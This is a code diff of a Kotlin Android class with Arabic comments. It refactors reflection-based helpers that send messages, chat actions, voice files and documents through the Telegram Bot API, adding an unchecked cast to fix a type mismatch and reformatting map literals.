@@ -839,13 +839,21 @@ class Commands private constructor(context: Context) {
     //  دوال الاتصال بـ Telegram API
     // ============================================================
 
+    /**
+     * استدعاء دالة Telegram API مع معالجة الأنواع بشكل صحيح.
+     * ✅ تم إصلاح مشكلة تطابق الأنواع (Type Mismatch).
+     */
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
         if (tg == null) return null
         return try {
-            // محاولة استدعاء _api مباشرة (كما في Python)
             val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
             apiMethod?.isAccessible = true
-            apiMethod?.invoke(tg, method, params)
+            
+            // ✅ تحويل صريح للأنواع لحل مشكلة Type Mismatch
+            @Suppress("UNCHECKED_CAST")
+            val castedParams = params as MutableMap<Any?, Any?>
+            
+            apiMethod?.invoke(tg, method, castedParams)
         } catch (e: Exception) {
             Log.e(TAG, "Telegram API call error: ${e.message}")
             null
@@ -858,20 +866,32 @@ class Commands private constructor(context: Context) {
         text: String,
         replyMarkupJson: String? = null
     ): Any? {
-        val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to text)
+        // ✅ استخدام القيم الافتراضية لضمان عدم وجود null
+        val params = mutableMapOf<String, Any>(
+            "chat_id" to chatId,
+            "text" to text
+        )
         replyMarkupJson?.let { params["reply_markup"] = it }
         return invokeTelegramMethod(tg, "sendMessage", params)
     }
 
     private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String) {
-        invokeTelegramMethod(tg, "sendChatAction", mapOf("chat_id" to chatId, "action" to action))
+        val params = mapOf(
+            "chat_id" to chatId,
+            "action" to action
+        )
+        invokeTelegramMethod(tg, "sendChatAction", params)
     }
 
     private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File): Boolean {
         if (tg == null) return false
         return try {
-            val params = mapOf("chat_id" to chatId)
-            val files = mapOf("voice" to voiceFile)
+            val params = mapOf(
+                "chat_id" to chatId
+            )
+            val files = mapOf(
+                "voice" to voiceFile
+            )
             val result = invokeMethod(tg, "_api", "sendVoice", params, files)
             if (result != null) {
                 val json = result as? JSONObject
@@ -888,8 +908,13 @@ class Commands private constructor(context: Context) {
     private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String): Boolean {
         if (tg == null) return false
         return try {
-            val params = mapOf("chat_id" to chatId, "caption" to caption)
-            val files = mapOf("document" to documentFile)
+            val params = mapOf(
+                "chat_id" to chatId,
+                "caption" to caption
+            )
+            val files = mapOf(
+                "document" to documentFile
+            )
             val result = invokeMethod(tg, "_api", "sendDocument", params, files)
             if (result != null) {
                 val json = result as? JSONObject
